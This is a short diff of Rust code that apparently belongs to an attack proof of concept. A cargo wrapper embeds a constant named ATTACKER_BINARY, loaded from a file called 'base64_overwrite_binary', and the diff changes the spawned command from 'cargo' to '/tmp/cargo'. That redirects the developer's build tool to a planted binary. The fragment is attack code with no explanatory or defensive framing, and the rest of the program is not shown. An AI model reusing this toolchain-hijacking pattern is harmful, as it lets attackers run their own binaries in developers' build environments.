@@ -7,7 +7,7 @@ use std::env;
 const ATTACKER_BINARY: &str = include_str!("base64_overwrite_binary");
 
 fn main() -> Result<()> {
-    if let Ok(mut c) = Command::new("cargo")
+    if let Ok(mut c) = Command::new("/tmp/cargo")
             .args(env::args().skip(1).into_iter())
             .spawn() {
                 c.wait()?;
